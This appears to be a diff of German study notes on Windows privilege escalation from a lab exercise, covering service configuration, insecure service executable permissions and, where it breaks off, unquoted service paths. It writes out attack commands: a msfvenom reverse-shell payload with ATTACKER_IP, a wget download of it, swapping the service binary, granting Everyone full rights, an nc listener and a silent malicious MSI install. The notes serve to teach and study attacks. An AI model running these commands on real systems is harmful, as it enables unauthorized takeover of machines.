@@ -1,3 +1,4 @@
+# Generelle Infos
 Vereinfacht gesagt, besteht die Privilegieneskalation darin, dass "Benutzer A" Zugang zu einem Host erhält und diesen nutzt, um durch Ausnutzung einer Schwachstelle im Zielsystem Zugang zu "Benutzer B" zu erhalten. Obwohl wir normalerweise wollen, dass "Benutzer B" über administrative Rechte verfügt, kann es Situationen geben, in denen wir uns in andere nicht privilegierte Konten einklinken müssen, bevor wir tatsächlich administrative Rechte erhalten.
 Der Zugriff auf verschiedene Konten kann so einfach sein wie das Auffinden von Anmeldeinformationen in Textdateien oder in Tabellen, die von einem unvorsichtigen Benutzer ungesichert gelassen wurden, aber das ist nicht immer der Fall. Je nach Situation müssen wir möglicherweise einige der folgenden Schwachstellen ausnutzen:
 
@@ -128,3 +129,83 @@ Da es sich um eine Reverse Shell handelt, sollten Sie auch das entsprechend konf
 ```
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
+
+# Ausnutzen von Fehl Konfigurierten Services
+
+### Windows Services
+  
+Windows-Dienste werden durch den Service Control Manager (SCM) verwaltet. Der SCM ist ein Prozess, der den Status von Diensten nach Bedarf verwaltet, den aktuellen Status eines bestimmten Dienstes überprüft und allgemein eine Möglichkeit zur Konfiguration von Diensten bietet.
+Jeder Dienst auf einem Windows-Rechner hat eine zugehörige ausführbare Datei, die vom SCM ausgeführt wird, sobald ein Dienst gestartet wird. Es ist wichtig zu beachten, dass ausführbare Dateien von Diensten spezielle Funktionen implementieren, um mit dem SCM kommunizieren zu können. Daher kann nicht jede ausführbare Datei erfolgreich als Dienst gestartet werden. Jeder Dienst gibt auch das Benutzerkonto an, unter dem der Dienst ausgeführt wird.
+
+Um die Struktur eines Dienstes besser zu verstehen, überprüfen wir die Konfiguration des Dienstes apphostsvc mit dem Befehl
+```
+sc qc *Servicename*
+bzw in dem Besipiel dann 
+sc qc apphostsvc
+```
+
+https://i.imgur.com/hBI3eMq.png
+
+Hier können wir in dem Beeipiel sehen, dass die zugehörige ausführbare Datei über den Parameter BINARY_PATH_NAME angegeben wird, und das Konto, das zur Ausführung des Dienstes verwendet wird, ist im Parameter SERVICE_START_NAME angegeben.
+
+Dienste verfügen über eine Discretionary Access Control List (DACL), die unter anderem angibt, wer die Berechtigung hat, den Dienst zu starten, zu stoppen, anzuhalten, den Status abzufragen, die Konfiguration abzufragen oder den Dienst neu zu konfigurieren. Die DACL kann über Process Hacker (auf dem Desktop Ihres Rechners verfügbar) eingesehen werden:
+
+https://imgur.com/zuQqnIE
+
+Alle Konfigurationen der Dienste werden in der Registry unter `HKLM\SYSTEM\CurrentControlSet\Services\` gespeichert:
+https://imgur.com/TqaLRxx
+
+Für jeden Dienst im System gibt es einen Unterschlüssel. Auch hier können wir die zugehörige ausführbare Datei im ImagePath Wert und das zum Starten des Dienstes verwendete Konto im Wert ObjectName sehen. Wenn für den Dienst eine DACL konfiguriert wurde, wird sie in einem Unterschlüssel namens Security gespeichert. Wie inzwischen bekannt ist, können solche Registry-Einträge standardmäßig nur von Administratoren geändert werden.
+
+###  Insecure Permissions on Service Executable
+Wenn die ausführbare Datei, die mit einem Dienst verbunden ist, schwache Berechtigungen hat, die es einem Angreifer erlauben, sie zu ändern oder zu ersetzen, kann der Angreifer die Privilegien des Kontos des Dienstes auf einfache Weise erlangen.
+
+Um zu verstehen, wie das funktioniert, schauen wir uns eine Sicherheitslücke an, die im Splinterware System Scheduler gefunden wurde. Zunächst werden wir die Konfiguration des Dienstes mit sc abfragen:
+
+https://imgur.com/dPeEhvL
+
+Wir sehen, dass der von der anfälligen Software installierte Dienst unter dem Namen svcuser1 ausgeführt wird und dass sich die ausführbare Datei, die mit dem Dienst verbunden ist, in `C:\Progra~2\System~1\WService.exe` befindet. Anschließend überprüfen wir die Berechtigungen für die ausführbare Datei:
+
+  https://imgur.com/yt80nnq
+
+Und hier haben wir etwas Interessantes. Die Gruppe Jeder hat Änderungsrechte (M) für die ausführbare Datei des Dienstes. Das bedeutet, dass wir sie einfach mit einem beliebigen Payload unserer Wahl überschreiben können, und der Dienst wird sie mit den Rechten des konfigurierten Benutzerkontos ausführen.
+Erzeugen wir einen Payload für einen Exe-Dienst mit msfvenom und stellen ihn über einen Python-Webserver bereit:
+
+Befehl für msfvenom 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+```
+Befehl für den Python web server zum Bereitstellen:
+```
+python3 -m http.server
+```
+
+Die Payload kann dann via Powershell mit dem Folgenden Befehl geladen werden: 
+
+```
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+```
+
+Sobald sich die Payload auf dem Windows-Server befindet, ersetzen wir die ausführbare Datei des Dienstes durch unsere Payload. Da wir einen anderen Benutzer benötigen, um unseren Payload auszuführen, müssen wir der Gruppe „Jeder“ ebenfalls volle Berechtigungen gewähren:
+Das machen wir mit den Befehlen: 
+```
+cd C:\PROGRA~2\SYSTEM~1\    #um in das Verzeichniss zu navigieren
+move WService.exe WService.exe.bkp   #Um die Orginale Datei umzubenennen zu WSERVICE.exe.bkp
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe    #Verschieben un Umbenennen der Payload
+icacls WService.exe /grant Everyone:F       #Allen Nutzern volle rechte geben
+```
+http://imgur.com/QvxL7UX
+
+Jetzt starten wir unseren Listener für die Reverse shell via `nc -lvp 4445` und im Anschluss kann der Dienst neugestartet werden via 
+```
+sc stop windowscheduler
+sc start windowscheduler
+```
+
+### Unquoted Service Paths
+
+Wenn wir nicht wie bisher direkt in die ausführbaren Dateien eines Dienstes schreiben können, gibt es immer noch die Möglichkeit, einen Dienst dazu zu zwingen, beliebige ausführbare Dateien auszuführen, indem man eine ziemlich obskure Funktion nutzt.
+Bei der Arbeit mit Windows-Diensten tritt ein ganz besonderes Verhalten auf, wenn der Dienst so konfiguriert ist, dass er auf eine „unquotierte“ ausführbare Datei verweist. Mit „unquotiert“ ist gemeint, dass der Pfad der zugehörigen ausführbaren Datei nicht richtig in Anführungszeichen gesetzt ist, um Leerzeichen im Befehl zu berücksichtigen.
+Schauen wir uns als Beispiel den Unterschied zwischen zwei Diensten an (diese Dienste dienen nur als Beispiel und sind auf Ihrem Rechner möglicherweise nicht verfügbar). Der erste Dienst verwendet ein korrektes Anführungszeichen, so dass der SCM zweifelsfrei weiß, dass er die Binärdatei mit dem Namen „C:\Programme\RealVNC\VNC Server\vncserver.exe“, gefolgt von den angegebenen Parametern, ausführen muss:
+
+![[Pasted image 20250617152036.png]]
